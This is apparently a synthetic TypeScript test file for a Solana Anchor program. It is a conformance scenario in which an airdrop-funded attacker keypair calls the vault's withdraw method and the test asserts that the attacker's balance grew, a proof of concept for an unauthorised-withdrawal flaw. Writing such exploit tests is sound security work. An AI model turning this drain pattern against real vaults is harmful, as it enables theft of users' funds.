// Conformance scenario "vault drain", TypeScript (Anchor). Synthetic.
// The admin initialises the vault in setup; the provider wallet pays every
// transaction (Anchor's default fee payer); the attacker is funded by an
// airdrop (the mutation), signs the withdrawal (the exploit), and the test
// asserts its balance grew.
import * as anchor from "@coral-xyz/anchor";
import { Keypair, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { assert } from "chai";

describe("vault", () => {
  const provider = anchor.AnchorProvider.env();
  const program = anchor.workspace.Vault;
  const admin = Keypair.generate();
  const attacker = Keypair.generate();

  before(async () => {
    await provider.connection.requestAirdrop(attacker.publicKey, LAMPORTS_PER_SOL);
    await program.methods
      .initialize()
      .accounts({ admin: admin.publicKey })
      .signers([admin])
      .rpc();
  });

  it("attacker drains the vault", async () => {
    const before = await provider.connection.getBalance(attacker.publicKey);
    await program.methods
      .withdraw()
      .accounts({ user: attacker.publicKey })
      .signers([attacker])
      .rpc();
    const after = await provider.connection.getBalance(attacker.publicKey);
    assert.isTrue(after > before);
  });
});
